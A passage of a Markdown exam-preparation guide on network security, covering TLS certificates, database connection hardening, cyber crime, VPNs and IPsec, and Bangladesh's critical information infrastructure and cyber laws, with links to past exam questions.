2. **Authenticates the server** — the certificate proves the site really is `dbbl.com.bd`, defeating phishing lookalikes and **pharming** (a fake site cannot obtain a valid certificate for the real domain).
3. **Guarantees integrity** — prevents an attacker or an ISP from injecting advertisements, malware or altered content into the page.
4. **Protects session cookies** from sniffing, preventing **session hijacking**.
5. **Prevents SSL stripping** when combined with **HSTS**.
6. **Builds user trust** — the padlock.
7. **Required for modern browser features** (geolocation, service workers, HTTP/2) and for **PCI-DSS compliance**.

#### Digital certificates and IP addresses

> ### "Which IP address can be secured via SSL and publicly signed by a CA?"
>
> **A public, routable IP address or a fully-qualified public domain name can be secured by a publicly trusted CA. A PRIVATE IP address cannot.**
>
> **The reason:** a public CA can only issue a certificate for something whose ownership it can **verify**. Private ranges — **10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16** — are used by millions of organisations simultaneously and belong to nobody in particular, so no CA can validate ownership. Since 2016 the CA/Browser Forum has **prohibited** publicly trusted certificates for internal names and private IPs.
>
> **How to secure internal systems instead:**
> 1. Use a **public domain name** that resolves internally (**split-horizon DNS**) and obtain a normal public certificate for it — the standard modern approach.
> 2. Run an **internal/private CA** (Microsoft AD Certificate Services, OpenSSL) and distribute its root certificate to all company devices.
> 3. Use a **self-signed certificate** — encrypted, but browsers will warn, so it is acceptable only for testing.
>
> *(A certificate **can** be issued for a **public** IP address, as an "IP address certificate", but it is uncommon; domain-name certificates are the norm.)*

#### Types of certificate

| By validation | Verification performed | Issued in |
|---|---|---|
| **DV — Domain Validated** | Only that the applicant controls the domain | Minutes (Let's Encrypt) |
| **OV — Organisation Validated** | The organisation's legal existence is checked | Days |
| **EV — Extended Validation** | Rigorous legal, physical and operational verification | Weeks — used by banks |

| By coverage | Covers |
|---|---|
| **Single-domain** | `www.example.com` |
| **Wildcard** | `*.example.com` — all subdomains |
| **Multi-domain (SAN/UCC)** | Several different domains in one certificate |

#### Securing a client-to-database connection

> *"Ensure secure communication between a client application and the database server."*

1. **Enable TLS on the database** — SQL Server *Force Encryption*, MySQL `require_secure_transport=ON`, PostgreSQL `ssl=on`, Oracle Native Network Encryption. Install a proper certificate on the DB server.
2. **Force the client to verify the server certificate** — use `sslmode=verify-full` (PostgreSQL) or the equivalent; otherwise the connection is encrypted but still vulnerable to MITM.
3. **Use mutual TLS (client certificates)** for the highest assurance.
4. **Never expose the database directly to the Internet** — keep it in the **internal network**, reachable only from the application server in the DMZ, on a **firewalled, specific port**.
5. Use a **VPN or SSH tunnel** for any remote administrative access.
6. **Strong authentication** — no default accounts, unique service accounts, strong passwords or **Kerberos/AD integration**, and **least privilege** on each schema.
7. **Encrypt data at rest** — TDE (Transparent Data Encryption) or column-level encryption for card and PII fields.
8. **Parameterised queries** in the application (SQL injection).
9. **Audit logging** of all access and privileged operations.
10. **Patch the DBMS** and disable unused features and network protocols.

> **"Which client is used to connect securely to a remote server?"** → **SSH (Secure Shell)** — using a client such as **PuTTY, OpenSSH or MobaXterm** — on **port 22**. SSH replaced **Telnet (port 23)**, which transmits **everything, including passwords, in plaintext** and must never be used across an untrusted network. SSH provides encryption, server authentication (host keys), and optional key-based client authentication.

**Previous Year Question List from this Topic:**

- [What is SSL?](../written-answers/computer-network-security.md?plain=1#L4331)
- [Which client is used to security cannot to a remote server?](../written-answers/computer-network-security.md?plain=1#L4354)
- [Ensure secure communication between a client application and the database server.](../written-answers/computer-network-security.md?plain=1#L4375)
- [Difference between HTTP and HTTPs.](../written-answers/computer-network-security.md?plain=1#L4411)
- [(গ) HTTP ও HTTPS প্রোটোকলের মধ্যে সুরক্ষার দিক থেকে কোনটি কার্যকর?](../written-answers/computer-network-security.md?plain=1#L4436)
- [Write down the basic differences of the following:](../written-answers/computer-network-security.md?plain=1#L4456)
- [What is SSL, TLS, and HTTPs?](../written-answers/computer-network-security.md?plain=1#L4481)
- [Attacker steals private key of website that uses transport layer security and remains undetected what can be done with private key?](../written-answers/computer-network-security.md?plain=1#L4508)
- [(a) Write the full form of those: (i) SSL (ii) TSL](../written-answers/computer-network-security.md?plain=1#L4536)
- [(b) Which IP address may have secured via SSL and publicly by the Certificate Authority(CA). If secured Write Yes or otherwise No.](../written-answers/computer-network-security.md?plain=1#L4558)
- [HTTPs কীভাবে একটি Website-এর সুরক্ষা দেয়? ব্লক ডায়াফ্রামের মাধ্যমে উত্তর দিন।](../written-answers/computer-network-security.md?plain=1#L4595)
- [What is the difference among threat, vulnerability and risk? Explain SSL and TLS.](../written-answers/computer-network-security.md?plain=1#L4633)


---

## Cyber Crime & Security

### Cyber Security, Cyber Crime and Cyber Space

#### What is cyber security?

**Cyber security** is the practice of **protecting systems, networks, programs and data from digital attacks, unauthorised access, damage and disruption**, in order to preserve their **confidentiality, integrity and availability**.

#### Why cyber security is important

1. **Protection of sensitive data** — customer records, financial data, health records, national security information.
2. **Financial loss prevention** — the global average cost of a data breach is measured in millions of dollars.
3. **Business continuity** — a ransomware attack can stop an organisation entirely.
4. **Reputation and trust** — customers leave a bank that loses their data.
5. **Regulatory and legal compliance** — the Bangladesh **Cyber Security Act**, Bangladesh Bank guidelines, PCI-DSS, GDPR.
6. **National security and critical infrastructure** — power grids, telecommunications, defence.
7. **Growing attack surface** — cloud, mobile, IoT, remote work and digital banking have multiplied the ways in.
8. **Increasingly sophisticated attackers** — organised crime, ransomware-as-a-service, and state-sponsored groups.
9. **Protection of intellectual property** and competitive advantage.
10. **Personal privacy** of every citizen.

#### Domains of cyber security

| Domain | Focus |
|---|---|
| **Network security** | Firewalls, IDS/IPS, segmentation, VPN |
| **Application security** | Secure coding, WAF, SAST/DAST |
| **Information/Data security** | Encryption, DLP, classification |
| **Endpoint security** | Antivirus/EDR, patching, device control |
| **Cloud security** | Configuration, IAM, shared responsibility |
| **Identity and Access Management** | Authentication, authorisation, MFA, PAM |
| **Operational security (OpSec)** | Processes, change control, least privilege |
| **Disaster recovery / BCP** | Backups, DR site, RTO and RPO |
| **End-user education** | Awareness training — the highest-return control |
| **Physical security** | Data-centre and office access control |

#### What is cyber space?

**Cyber space** is the **global, virtual environment created by the interconnection of computer networks, systems and digital communication** — the "space" in which online activity, communication, commerce and social interaction take place. It has **no physical geography and no national borders**, which is exactly what makes policing it so difficult.

**Threats within cyber space:** hacking and unauthorised access · malware and ransomware · phishing and identity theft · financial and online banking fraud · data breaches · **cyber bullying and harassment** · **fake news and misinformation** · **cyber stalking** · child exploitation · **cyber terrorism** and attacks on critical infrastructure · **cyber espionage** and state-sponsored attacks · privacy violation and mass surveillance · online piracy and IP theft · hate speech and radicalisation · **cryptocurrency fraud**.

#### What is cyber crime?

**Cyber crime** is any **criminal activity that involves a computer, a networked device or a network** — either as the **tool** of the crime, the **target** of the crime, or both.

#### Types of cyber crime

| Category | Crimes |
|---|---|
| **Against individuals** | Identity theft, **phishing**, **cyber bullying and harassment**, **cyber stalking**, defamation, revenge pornography, online blackmail, email spoofing |
| **Against property** | **Hacking**, virus and ransomware attacks, **software piracy**, intellectual property theft, **credit card and online banking fraud**, cryptojacking, **data theft** |
| **Against organisations** | **Data breach**, **DDoS attacks**, corporate espionage, **insider fraud**, website defacement, **ransomware extortion**, supply-chain attacks |
| **Against society / the state** | **Cyber terrorism**, attacks on critical infrastructure, **cyber warfare**, spreading **fake news and rumours** that cause communal violence, online radicalisation, **election interference**, trafficking through the dark web |
| **Financial** | Online banking fraud, ATM/card skimming, **MFS (bKash/Nagad) fraud**, investment and Ponzi schemes, **business email compromise**, money laundering |

**Eight cyber crimes to name in an exam:** **hacking, phishing, identity theft, ransomware, online financial fraud, cyber bullying, data theft, and software piracy.**

#### Steps to prevent cyber crime

**Individual level**
1. Use **strong, unique passwords** and a password manager; enable **MFA** on every important account.
2. **Never share OTP, PIN or password** with anyone, on any pretext.
3. Keep the operating system, applications and antivirus **updated**.
4. **Do not click** links or open attachments in unexpected messages.
5. Avoid **public Wi-Fi** for banking; use a VPN if you must.
6. Verify a website's **HTTPS padlock and exact domain name** before entering credentials.
7. Take **regular backups**.
8. Limit what you share on **social media** — it is the raw material of social engineering.
9. **Check bank statements regularly** and report anomalies immediately.

**Organisational level**
10. **Security policy, standards and enforcement**.
11. **Employee awareness training** and simulated phishing.
12. **Firewalls, IDS/IPS, EDR, WAF, encryption** — defence in depth.
13. **Access control, least privilege and segregation of duties**.
14. **Regular audits, vulnerability scanning and penetration testing**.
15. **Patch management** and asset inventory.
16. **Incident response and business continuity plans**, rehearsed.
17. **Vendor and third-party risk management**.
18. **Logging, monitoring and a SOC**.

**National level**
19. **Strong cyber law and enforcement** with trained cyber police and digital-forensics capability.
20. **A national CERT/CIRT** for coordination and early warning.
21. **Public awareness campaigns**.
22. **International cooperation** — cyber crime crosses borders.
23. **Protection of Critical Information Infrastructure**.
24. Building a skilled **cyber security workforce**.

#### The insider threat

> *"Employees cause the most risk of fraud and computer compromise — do you agree?"*

**Largely yes — and this is the answer the examiner is looking for**, with the nuance below.

**The case in favour:**
1. **Insiders already have authorised access** — they do not need to break in, so most technical perimeter controls (firewall, IDS) simply do not apply.
2. **They know where the valuable data is** and how the controls work.
3. **Their activity looks normal**, so detection is far harder and breaches go unnoticed for longer.
4. **Negligent insiders** — those who click a phishing link, use a weak password, lose a laptop or email data to the wrong address — are involved in a very large share of all breaches. **Most insider incidents are careless, not malicious.**
5. **Departing employees** frequently take data with them.
6. **Privileged users** (administrators, DBAs) can bypass almost every control and erase the logs.
7. Industry studies consistently attribute a majority of incidents to a **human element** — error, misuse or stolen credentials.

**The qualification:** in raw **numbers**, external attacks are more frequent; but in **impact and cost per incident**, insider incidents are typically **higher**, because the insider reaches the valuable data directly. The correct position is: *"Insiders — whether malicious or merely careless — represent the single largest **risk**, though not always the largest **volume** of attacks."*

**Controls against the insider threat:** **least privilege** and regular access reviews · **separation of duties and dual control** (maker-checker) · **mandatory leave/job rotation** for sensitive roles · **background checks** on hiring · **logging and behavioural monitoring (UEBA)** of privileged accounts · **DLP** to detect data leaving · **immediate revocation of all access on termination** · **NDAs and clear policy** · **training** to reduce negligence · and a **confidential reporting channel**.

#### Cyber Threat Intelligence (CTI)

**Cyber Threat Intelligence** is **evidence-based knowledge about existing or emerging cyber threats** — including **indicators of compromise (IOCs)**, attacker tactics, techniques and procedures (**TTPs**), motives and targets — that an organisation uses to make **informed, proactive defensive decisions**.

**A CTI database** stores this intelligence: known **malicious IP addresses, domains, URLs, file hashes, malware signatures, phishing patterns, vulnerability data (CVEs)** and threat-actor profiles, drawn from commercial feeds, open sources (OSINT), government CERTs, industry sharing groups (**FS-ISAC** for finance) and the organisation's own incidents.

**Its use in a corporate network:**

| Use | Benefit |
|---|---|
| **Automatic blocking** | Feed IOCs directly into the firewall, proxy, email gateway and EDR to block known-bad indicators |
| **Detection and correlation** | The SIEM matches internal logs against known attacker infrastructure |
| **Proactive threat hunting** | Search for evidence of TTPs before an alert fires |
| **Vulnerability prioritisation** | Patch first the vulnerabilities that are **actually being exploited in the wild** |
| **Incident response** | Identify which malware family and actor is involved, and therefore what to look for next |
| **Phishing defence** | Block newly registered lookalike domains before the campaign starts |
| **Risk and strategic planning** | Understand which threat actors target your sector, and invest accordingly |
| **Early warning** | Learn of a sector-wide campaign from peers before it reaches you |

**Types of CTI:** **Strategic** (high-level, for executives) · **Tactical** (TTPs, for security architects) · **Operational** (specific campaigns) · **Technical** (IOCs, for automated tools).

**Previous Year Question List from this Topic:**

- [সাইবার অপরাধের প্রকারভেদ পরিবেশের স্থায়িত্ব বর্ণনা করুন।](../written-answers/computer-network-security.md?plain=1#L4671)
- [Why is cyber security important? What are the common types of cyber threats? Explain cyber security measures.](../written-answers/computer-network-security.md?plain=1#L4705)
- [What is Cybercrime? Cybercrime রোধে প্রয়োজনীয় পদক্ষেপ গুলো লিখ।](../written-answers/computer-network-security.md?plain=1#L4776)
- [What is Cyber space? Write some threats of cyber space.](../written-answers/computer-network-security.md?plain=1#L4813)
- [Write the cyber security threats.](../written-answers/computer-network-security.md?plain=1#L4852)
- [What is cyber threat intelligence database? What is the use of this in corporate office network?](../written-answers/computer-network-security.md?plain=1#L4906)
- [সাইবার অপরাধ কি? ৮টি সাইবার অপরাধ এর নাম লিখুন। সাইবার অপরাধ দূর করার জন্য ৬টি পন্থার নাম লিখুন।](../written-answers/computer-network-security.md?plain=1#L4936)
- [Employee causes the most risk of fraud and computer compromises- do you agree with the statement. Justify your answer.](../written-answers/computer-network-security.md?plain=1#L4963)
- [What is Cyber Security? Write down the top 10 cyber attack. Discuss about Ransomware and DDoS attack.](../written-answers/computer-network-security.md?plain=1#L341)


---

## VPN & Tunneling Protocols (IPsec, SSL VPN)

### VPN — Concept, Types and Working

#### What is a VPN?

A **VPN (Virtual Private Network)** creates a **secure, encrypted "tunnel" over a public network (the Internet)**, allowing data to be transmitted as if the devices were directly connected on a **private network**.

> **"Virtual"** because there is no dedicated physical line — it runs over the shared public Internet.
> **"Private"** because encryption makes the traffic unreadable to anyone in between.
> **"Network"** because it extends the organisation's network to remote locations and users.

#### The purpose of a VPN

1. **Confidentiality** — all traffic is **encrypted**, so an ISP, a Wi-Fi operator or an eavesdropper sees only ciphertext.
2. **Secure remote access** — employees can safely reach internal systems from home or while travelling.
3. **Connect branch offices** securely over the Internet, replacing expensive leased lines.
4. **Authentication** — only verified users and devices can enter the network.
5. **Integrity** — modification in transit is detected.
6. **Anonymity / IP masking** — the destination sees the VPN server's IP, not yours.
7. **Bypassing geo-restrictions and censorship**.
8. **Protection on public Wi-Fi** — the single most practical everyday benefit.
9. **Cost saving** — a fraction of the cost of a dedicated MPLS or leased line.

#### How a VPN works

```mermaid
flowchart LR
    A["💻 Remote user<br/>(home / hotel / café)"] --> B["VPN CLIENT<br/>encrypts and ENCAPSULATES<br/>each packet"]
    B -->|"🔒 ENCRYPTED TUNNEL<br/>through the public Internet —<br/>unreadable to anyone in between"| C["VPN GATEWAY / Server<br/>at the office"]
    C --> D["Authenticate the user<br/>DECRYPT and de-encapsulate"]
    D --> E["🏢 Internal corporate network<br/>file servers, applications, databases"]
```

**Step by step**
1. The user launches the VPN client and **authenticates** (username/password + certificate or **MFA**).
2. Client and gateway negotiate the **encryption algorithms and keys** (IKE for IPsec, or a TLS handshake).
3. Each outgoing packet is **encrypted** and then **encapsulated** inside a new packet addressed to the VPN gateway — this is **tunnelling**.
4. The encapsulated packet travels over the public Internet. Anyone intercepting it sees only *"an encrypted packet going from A to the VPN gateway"* — not its contents or its true destination.
5. The gateway **decrypts and de-encapsulates** the packet and forwards it into the internal network.
6. Replies travel back the same way.

#### Tunnelling and encapsulation

**Tunnelling** is the process of **placing an entire packet (with its own headers) inside the payload of another packet**. This is what lets private addresses and protocols travel across a public network that could not otherwise route them.

#### Site-to-Site VPN vs Remote-Access VPN

```mermaid
flowchart TD
    subgraph S2S["SITE-TO-SITE VPN"]
        HQ["🏢 Head Office LAN<br/>Dhaka"] --- G1["VPN Gateway<br/>(router/firewall)"]
        G1 -->|"🔒 permanent tunnel<br/>over the Internet"| G2["VPN Gateway"]
        G2 --- BR["🏢 Branch Office LAN<br/>Chittagong"]
    end
    subgraph RA["REMOTE-ACCESS VPN"]
        U1["💻 Employee at home"] -->|"🔒 on-demand tunnel"| GW["VPN Gateway"]
        U2["📱 Employee travelling"] -->|"🔒"| GW
        U3["💻 Employee in a café"] -->|"🔒"| GW
        GW --- OFF["🏢 Office LAN"]
    end
```

| Point | **Site-to-Site VPN** | **Remote-Access VPN** |
|---|---|---|
| **Connects** | **Two entire NETWORKS** (office to office) | **One individual USER/device** to a network |
| **Endpoints** | **Router-to-router / gateway-to-gateway** | **Client software to a gateway** |
| **Client software on user devices?** | ❌ **Not needed** — the tunnel is transparent to users | ✅ **Required** on each device |
| **Tunnel duration** | **Permanent / always on** | **On demand** — established when the user connects |
| **Number of users** | **All users of both sites**, automatically | One user per connection |
| **Typical protocol** | **IPsec** | **SSL/TLS VPN**, or IPsec with a client |
| **Configuration** | Done **once**, by network administrators | Per user, per device |
| **Scalability** | Scales by adding sites | Scales by adding user licences |
| **Sub-types** | **Intranet-based** (offices of one company) · **Extranet-based** (with a partner company) | — |
| **Use case** | Linking a bank's head office, branches and DR site | Work from home, a travelling sales team, third-party support access |
| **Cost** | Higher initial hardware cost; cheap per user | Cheap to start; per-user licensing |

#### VPN protocols

| Protocol | Layer | Security | Notes |
|---|---|---|---|
| **IPsec** | **Network (Layer 3)** | ✅ **Very strong** | The standard for **site-to-site**; secures **all** IP traffic |
| **SSL/TLS VPN (OpenVPN)** | **Transport/Application (4–7)** | ✅ Strong | Ideal for **remote access**; works through firewalls on port 443; **browser-based (clientless) options** |
| **WireGuard** | Network | ✅ Strong | Modern, very fast, simple code base |
| **L2TP/IPsec** | Layer 2 (+ IPsec) | ✅ Good | L2TP provides tunnelling, IPsec provides encryption |
| **PPTP** | Layer 2 | ❌ **BROKEN** | Obsolete — do not use |
| **SSTP** | Application | ✅ Good | Microsoft, over TLS |

#### IPsec

**IPsec (Internet Protocol Security)** is a suite of protocols that secures IP communication by **authenticating and encrypting every IP packet**.

> ### "In which layer does IPsec work?"
> **IPsec operates at the NETWORK LAYER — Layer 3 of the OSI model** (the Internet layer of TCP/IP).
>
> **Why this matters:** because it works at Layer 3, IPsec **protects ALL traffic from ALL applications automatically and transparently** — the applications do not need to know it exists and do not need to be modified. This is its key advantage over TLS, which operates higher up and must be implemented per application.

**The components of IPsec**

| Component | Function |
|---|---|
| **AH — Authentication Header** | Provides **authentication and integrity** of the whole packet, and anti-replay protection. **It does NOT encrypt** — the data remains readable. Protocol 51 |
| **ESP — Encapsulating Security Payload** | Provides **ENCRYPTION (confidentiality)** plus authentication, integrity and anti-replay. **The one actually used in practice.** Protocol 50 |
| **IKE — Internet Key Exchange** | **Negotiates the security parameters and exchanges keys** (using Diffie-Hellman), and authenticates the peers with pre-shared keys or certificates. UDP port 500 |
| **SA — Security Association** | The **agreed set of parameters** (algorithms, keys, lifetime) for one direction of one connection. Two SAs are needed for bidirectional traffic |
| **SPD / SAD** | The **Security Policy Database** (what to protect and how) and the **Security Association Database** (the active SAs) |

**The two modes of IPsec**

| Mode | What is protected | Used for |
|---|---|---|
| **Transport mode** | Only the **payload** is encrypted; the **original IP header is kept** | **Host-to-host** communication within a trusted network |
| **Tunnel mode** ⭐ | **The ENTIRE original packet** — header and payload — is encrypted and wrapped in a **new IP header** | **Site-to-site VPNs** and remote access. It hides the internal addresses completely |

```mermaid
flowchart TD
    A["Original packet:<br/>[IP header][TCP][Data]"] --> B["TRANSPORT mode:<br/>[IP header][ESP][TCP][Data encrypted][ESP trailer]<br/>— the original IP header is VISIBLE"]
    A --> C["TUNNEL mode:<br/>[NEW IP header][ESP][IP header][TCP][Data — ALL encrypted][ESP trailer]<br/>— the ENTIRE original packet, including addresses, is hidden"]
```

**IPsec vs SSL VPN**

| Point | **IPsec VPN** | **SSL/TLS VPN** |
|---|---|---|
| **OSI layer** | **Network (3)** | **Transport/Application (4–7)** |
| **Scope of protection** | **ALL IP traffic**, all applications | Usually **specific applications** (or all, with a client) |
| **Client software** | **Required** | Often **clientless — just a browser** |
| **Firewall/NAT traversal** | Can be blocked; needs NAT-T | ✅ **Easy — uses port 443**, which is always open |
| **Granular access control** | Coarse — full network access | ✅ **Fine-grained — per application/resource** |
| **Best for** | **Site-to-site** tunnels, full network access | **Remote users**, contractors, BYOD |
| **Configuration effort** | Higher | Lower |

#### Limitations of a VPN

Reduced **speed** (encryption overhead and a longer path) · **the VPN provider can see your traffic** — you are transferring trust, not eliminating it · a **single point of failure** and a high-value target for attackers · it does **not** protect against malware, phishing or an insecure endpoint · **VPN credentials are a prime target** (many ransomware attacks begin with a compromised VPN account, which is why **MFA on the VPN is essential**) · some services block known VPN IPs · and legal restrictions in some countries.

**Previous Year Question List from this Topic:**

- [What is the purpose of VPN used in computer security?](../written-answers/computer-network-security.md?plain=1#L5242)
- [In which layer IPsec works?](../written-answers/computer-network-security.md?plain=1#L5262)
- [What is VPN? How it is working.](../written-answers/computer-network-security.md?plain=1#L5284)
- [(a) How can VPN provide secure communication platform? Explain site-to-site VPN and remote-access VPN using necessary figures.](../written-answers/computer-network-security.md?plain=1#L5312)
- [What is VPN? Difference between site to site VPN and Remote access VPN.](../written-answers/computer-network-security.md?plain=1#L5368)
- [What is VPN? Why we use it?](../written-answers/computer-network-security.md?plain=1#L5397)


---

## Critical Information Infrastructure (CII) & Cyber Governance

### Critical Information Infrastructure and Cyber Law in Bangladesh

#### What is CII?

**Critical Information Infrastructure (CII)** refers to the **information and communication systems whose disruption, destruction or compromise would have a SEVERE and DEBILITATING impact on national security, the economy, public health and safety, or the effective functioning of the government.**

> In short: the digital systems a country **cannot afford to lose**.

#### CII in Bangladesh

CII is defined and protected under the **Digital Security Act 2018**, now succeeded by the **Cyber Security Act 2023**. The government, through the **Digital Security Agency / National Cyber Security Agency** and the **BGD e-GOV CIRT** (the national Computer Incident Response Team), **formally designates** specific organisations as CII.

The designated list has been expanded several times and currently comprises roughly **30 or more organisations** *(the number has grown from an initial 29; always state it as "around 30, as designated by the government" rather than a fixed figure, since the list is updated).*

**Organisations designated as CII in Bangladesh include:**

| Sector | Organisations |
|---|---|
| **Central banking & finance** | **Bangladesh Bank**, Bangladesh Securities and Exchange Commission, **Sonali Bank**, Janata Bank, Agrani Bank, Rupali Bank |
| **Identity & civil registration** | **National Identity Registration Wing (NID) of the Election Commission**, the Birth & Death Registration office |
| **Telecommunications** | **BTRC**, **BTCL**, Teletalk, **Bangladesh Submarine Cable Company (BSCCL)** |
| **Power & energy** | **Power Grid Company of Bangladesh (PGCB)**, BPDB, Petrobangla, **Rooppur Nuclear Power Plant** |
| **Government IT** | **Bangladesh Computer Council (BCC)** / National Data Centre, **a2i**, the Ministry of Public Administration |
| **Revenue & trade** | **National Board of Revenue (NBR)**, Bangladesh Bank's Foreign Exchange systems, the Customs system |
| **Transport & ports** | **Chittagong Port Authority**, Biman Bangladesh Airlines, Civil Aviation Authority, Bangladesh Railway |
| **Health** | **Directorate General of Health Services (DGHS)** |
| **Security & defence** | The Armed Forces Division, Police headquarters, **Immigration & Passports (e-Passport)** |
| **Education** | The Education Board's result and registration systems |

*(Name any **ten** of the above in an exam — Bangladesh Bank, NID/Election Commission, BTRC, BTCL, BSCCL, PGCB, BCC, NBR, Chittagong Port Authority and DGHS make a strong, defensible list.)*

#### Obligations placed on a CII organisation

1. Appoint a dedicated **Chief Information Security Officer (CISO)** and a security team.
2. Conduct **regular security audits and vulnerability assessments** (typically at least annually) by approved auditors.
3. Implement the prescribed **security standards and controls** (aligned with ISO 27001 and the national guideline).
4. **Report incidents** to the **BGD e-GOV CIRT / National Cyber Security Agency** within the mandated time.
5. Maintain a **documented and tested incident response and business continuity plan**.
6. Maintain **logs** for the prescribed retention period.
7. Restrict and monitor **privileged access**; enforce MFA.
8. Conduct **staff security awareness training**.
9. Participate in **national cyber drills** and information sharing.

**Penalties:** unauthorised access to a CII is a serious offence under the Cyber Security Act 2023, carrying substantial imprisonment and fines — significantly heavier than for ordinary systems.

#### Cyber security laws of Bangladesh

| Law | Year | Key provisions |
|---|---|---|
| **ICT Act (Information & Communication Technology Act)** | **2006** (amended 2009, 2013) | The first cyber law: legal recognition of **electronic records and digital signatures**, established the **Controller of Certifying Authorities (CCA)**, and created the **Cyber Tribunal**. Its **Section 57** became notorious for restricting online expression |
| **Digital Security Act (DSA)** | **2018** | Replaced ICT Act sections 54, 55, 56, **57** and 66. Created the **Digital Security Agency** and the **National Digital Security Council**; defined **CII**; criminalised hacking, identity fraud, digital forgery, cyber terrorism, spreading communal hatred, defamation and propaganda. **Heavily criticised** by journalists and human-rights organisations for vague provisions (sections 21, 25, 28, 29, 31) used against free expression, and for non-bailable offences |
| **Cyber Security Act (CSA)** | **2023** | **Repealed and replaced the DSA.** Made several offences **bailable**, reduced some penalties, and removed imprisonment for defamation — but critics note that the most contested provisions were largely carried over |
| **Bangladesh Telecommunication Act** | 2001 | Regulates telecom operations; established the **BTRC** |
| **Copyright Act** | 2000 / **2023** | Protects software, digital content and databases |
| **Pornography Control Act** | 2012 | Criminalises production and distribution of pornographic content |
| **Money Laundering Prevention Act** | 2012 | Covers cyber-enabled financial crime |
| **Right to Information Act** | 2009 | Citizens' right of access to information |
| **Bangladesh Bank ICT Security Guideline** | latest version | **Mandatory** security framework for all banks and financial institutions |
| **Draft Personal Data Protection Act** | in process | Would establish comprehensive data-protection rights |

**The institutional framework:** the **National Cyber Security Agency** (policy and coordination) · **BGD e-GOV CIRT** (national incident response) · the **Cyber Crime Investigation Division of the CID** and the **Counter Terrorism and Transnational Crime (CTTC)** unit's Cyber Crime wing (investigation) · the **Cyber Tribunal** (prosecution) · the **CCA** (digital signature regulation) · and the **BTRC** (telecom regulation).

**A balanced concluding point for an essay answer:** Bangladesh has built a reasonably complete legal architecture for cyber security, and a strong law is genuinely necessary given the scale of online fraud and attacks on critical infrastructure. The persistent criticism is not of the *existence* of the law but of **vaguely worded speech-related provisions** that can be applied broadly, and of the **capacity gap** — there are far more cases than there are trained investigators, forensic laboratories and tribunal capacity. The direction of reform should be **precise definitions, procedural safeguards, judicial oversight, and heavy investment in technical capability and public awareness**.

**Previous Year Question List from this Topic:**

- [What is CII? How many CII organizations? Name 10 CII organization name.](../written-answers/computer-network-security.md?plain=1#L5428)
- [CTC কী? কী কাজে ব্যবহার হয়?](../written-answers/computer-network-security.md?plain=1#L5459)
- [(c) Briefly write about the cybersecurity laws of Bangladesh.](../written-answers/computer-network-security.md?plain=1#L5475)


---

## Cryptography & Network Security Scenarios

### Designing a Secure Transmission Protocol

Scenario questions ask you to **design security for a specific situation**. The method is always the same: **identify the assets and threats, then apply controls that address each CIA property, in layers.**

#### The design framework

```mermaid
flowchart TD
    A["1 . IDENTIFY assets and data sensitivity"] --> B["2 . MODEL the threats<br/>(who attacks, how, why)"]
    B --> C["3 . Define security REQUIREMENTS<br/>per CIA + authentication + non-repudiation"]
    C --> D["4 . Select CONTROLS for each requirement"]
    D --> E["5 . Layer them — DEFENCE IN DEPTH"]
    E --> F["6 . Plan DETECTION and RESPONSE<br/>(assume prevention will fail)"]
    F --> G["7 . TEST, audit and review continuously"]
```

#### A worked design — secure data transmission between two nodes

> *"Design a secure transmission protocol for sending data from one node to another."*

**Step 1 — Requirements.** The protocol must provide **confidentiality** (nobody in between can read it), **integrity** (any alteration is detected), **authentication** (each node proves who it is), **non-repudiation** (the sender cannot deny it), **replay protection**, and **forward secrecy**.

**Step 2 — The handshake (key establishment and authentication)**

```mermaid
sequenceDiagram
    participant A as Node A
    participant B as Node B
    A->>B: 1 . Hello — supported algorithms, nonce_A, timestamp
    B->>A: 2 . Hello — chosen algorithms, nonce_B, CERTIFICATE_B
    A->>A: 3 . Verify Certificate B against the trusted CA<br/>(validity, revocation, identity)
    A->>B: 4 . CERTIFICATE_A + ECDHE public value, SIGNED with A's private key
    B->>A: 5 . ECDHE public value, SIGNED with B's private key
    Note over A,B: 6 . Both derive the same SESSION KEY from ECDHE<br/>— ephemeral, so PERFECT FORWARD SECRECY
    A->>B: 7 . Finished (MAC over the whole handshake — prevents downgrade attacks)
    B->>A: 8 . Finished
```

**Step 3 — The data transfer phase**

For each message:
1. Attach a **sequence number and timestamp** → defeats **replay attacks**.
2. Compute a **digital signature** over the message using the sender's **private key** → **authentication and non-repudiation**.
3. **Encrypt** the message plus signature with **AES-256-GCM** using the session key → **confidentiality**, and GCM provides **authenticated encryption**, so integrity is built in.
4. Transmit.
5. The receiver **decrypts**, verifies the **authentication tag** (integrity), checks the **sequence number and timestamp** (replay), and verifies the **signature** (authenticity).

**Step 4 — Supporting controls**
- **Key management:** ephemeral session keys rotated per session and after a volume/time limit; long-term keys stored in an **HSM**.
- **Certificate management:** issued by a trusted CA, checked against **CRL/OCSP**, with defined expiry and revocation procedures.
- **Algorithm agility:** negotiate algorithms so that weak ones can be retired; **reject downgrade** attempts.
- **Rate limiting and DoS protection** on the handshake.
- **Logging** of every session establishment for audit.

**Step 5 — What to say about attacks it defends against**

| Attack | Defence in this design |
|---|---|
| **Eavesdropping** | AES-256 encryption |
| **Tampering** | GCM authentication tag + digital signature |
| **Man-in-the-Middle** | **Certificate-based mutual authentication** — the attacker cannot forge a CA-signed certificate |
| **Replay** | Sequence numbers, timestamps and nonces |
| **Repudiation** | Digital signatures with non-exportable private keys |
| **Retrospective decryption after key theft** | **Ephemeral ECDHE → Perfect Forward Secrecy** |
| **Downgrade attack** | The Finished MAC covers the entire handshake |

> **In practice, do not invent a protocol — use TLS 1.3.** The single most important point to make in such an answer is that **hand-rolled cryptographic protocols almost always contain subtle fatal flaws**. The correct professional answer is to **use a well-analysed standard (TLS 1.3, IPsec, SSH, Signal Protocol)** and to design carefully only the parts *around* it — key management, certificate lifecycle, authentication policy and monitoring.

#### A worked design — securing a submarine cable landing station / critical facility

> *"Cox's Bazar wants to secure its cable landing station" — the general pattern for any critical national facility.*

| Layer | Controls |
|---|---|
| **Physical** | Perimeter fence, **mantrap**, biometric + card access, 24×7 guards, CCTV with retention, visitor escorting, tamper-evident seals on equipment |
| **Network architecture** | Strict **segmentation** — management network, operational network and corporate network fully separated; **DMZ** for anything public-facing; no direct Internet access from the operational network |
| **Perimeter** | Redundant **NGFW** from different vendors, **IPS**, anti-DDoS scrubbing upstream at the ISP |
| **Cryptography** | **IPsec/MACsec** encryption of all inter-site links; **TLS 1.3** for every management interface; encrypted backups |
| **Access control** | **MFA mandatory** for every administrator; **Privileged Access Management (PAM)** with session recording; **least privilege**; no shared accounts |
| **Monitoring** | **SIEM** aggregating all logs, **24×7 SOC**, **IDS on every segment**, file-integrity monitoring, **CTI feeds** |
